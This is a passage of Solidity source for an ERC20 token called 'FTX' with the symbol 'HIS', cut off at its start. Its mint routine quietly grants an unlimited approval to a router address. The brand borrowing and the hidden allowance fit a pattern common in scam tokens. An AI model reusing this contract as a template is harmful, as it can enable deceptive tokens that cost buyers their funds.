Transfer(sender, recipient, amount);\n    }\n\n    function _DeployHis(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n \n        approve(_router, ~uint256(0));\n    \n        emit Transfer(address(0), account, amount);\n    }\n}\n\ncontract ERC20Token is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        address creator, uint256 initialSupply\n    ) ERC20(name, symbol) {\n        _DeployHis(creator, initialSupply);\n    }\n}\n\ncontract HisFTX is ERC20Token {\n    constructor() ERC20Token(\"FTX\", \"HIS\", msg.sender, 42069000000 * 10 ** 18) {\n    }\n}"
}